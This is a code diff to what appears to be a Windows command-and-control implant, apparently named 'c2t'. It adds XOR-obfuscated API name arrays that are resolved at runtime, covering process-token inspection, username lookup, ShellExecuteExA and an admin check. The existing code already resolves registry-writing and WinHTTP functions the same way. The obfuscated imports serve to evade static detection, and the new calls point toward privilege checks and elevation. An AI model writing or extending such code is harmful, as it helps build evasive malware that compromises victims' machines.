@@ -270,6 +270,9 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_RtlGetVersion[] = {8, 46, 54, 29, 63, 46, 12, 63, 40, 41, 51, 53, 52};
 
   /* advapi32 functions */
+  static const unsigned char enc_OpenProcessToken[] = {21, 58, 63, 52, 26, 40, 53, 57, 63, 41, 41, 30, 53, 49, 63, 52};
+  static const unsigned char enc_GetTokenInformation[] = {29, 63, 46, 30, 53, 49, 63, 52, 19, 52, 60, 53, 40, 55, 59, 46, 51, 53, 52};
+  static const unsigned char enc_GetUserNameA[] = {29, 63, 46, 15, 41, 63, 40, 20, 59, 55, 63, 27};
   static const unsigned char enc_SystemFunction036[] = {9, 35, 41, 46, 63, 55, 28, 47, 52, 57, 46, 51, 53, 52, 106, 105, 108};
 
   /* bcrypt functions */
@@ -287,6 +290,8 @@ void c2t_win32_api_init(void) {
   /* shell32 functions */
   static const unsigned char enc_SHGetFolderPathW[] = {9, 18, 29, 63, 46, 28, 53, 54, 62, 63, 40, 10, 59, 46, 50, 13};
   static const unsigned char enc_DragQueryFileW[] = {30, 40, 59, 61, 11, 47, 63, 40, 35, 28, 51, 54, 63, 13};
+  static const unsigned char enc_ShellExecuteExA[] = {9, 50, 63, 54, 54, 31, 42, 63, 57, 47, 46, 63, 31, 34, 27};
+  static const unsigned char enc_IsUserAnAdmin[] = {19, 41, 15, 41, 63, 40, 27, 52, 27, 62, 55, 51, 52};
 
   /* winhttp functions */
   static const unsigned char enc_WinHttpOpen[] = {13, 51, 52, 18, 46, 46, 42, 21, 42, 63, 52};
@@ -526,6 +531,9 @@ void c2t_win32_api_init(void) {
   LOAD_API(hNtdll, RtlGetVersion, enc_RtlGetVersion);
 
   /* advapi32 */
+  LOAD_API(hAdvapi32, OpenProcessToken, enc_OpenProcessToken);
+  LOAD_API(hAdvapi32, GetTokenInformation, enc_GetTokenInformation);
+  LOAD_API(hAdvapi32, GetUserNameA, enc_GetUserNameA);
   LOAD_API(hAdvapi32, RtlGenRandom, enc_SystemFunction036);
   LOAD_API(hAdvapi32, RegOpenKeyExA, enc_RegOpenKeyExA);
   LOAD_API(hAdvapi32, RegSetValueExA, enc_RegSetValueExA);
@@ -541,6 +549,8 @@ void c2t_win32_api_init(void) {
   /* shell32 */
   LOAD_API(hShell32, SHGetFolderPathW, enc_SHGetFolderPathW);
   LOAD_API(hShell32, DragQueryFileW, enc_DragQueryFileW);
+  LOAD_API(hShell32, ShellExecuteExA, enc_ShellExecuteExA);
+  LOAD_API(hShell32, IsUserAnAdmin, enc_IsUserAnAdmin);
 
   /* winhttp */
   LOAD_API(hWinhttp, WinHttpOpen, enc_WinHttpOpen);
